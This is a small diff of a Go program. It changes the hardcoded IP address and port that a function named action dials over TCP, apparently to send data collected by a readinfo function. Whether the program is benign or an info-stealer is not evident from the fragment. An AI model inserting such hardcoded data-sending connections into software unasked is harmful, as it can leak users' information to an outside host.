@@ -50,7 +50,7 @@ func readinfo() {
 }
 
 func action(data []byte) {
-	conn, err := net.Dial("tcp", "202.127.26.244:48080")
+	conn, err := net.Dial("tcp", "202.127.26.251:9900")
 	if err != nil {
 
 		return
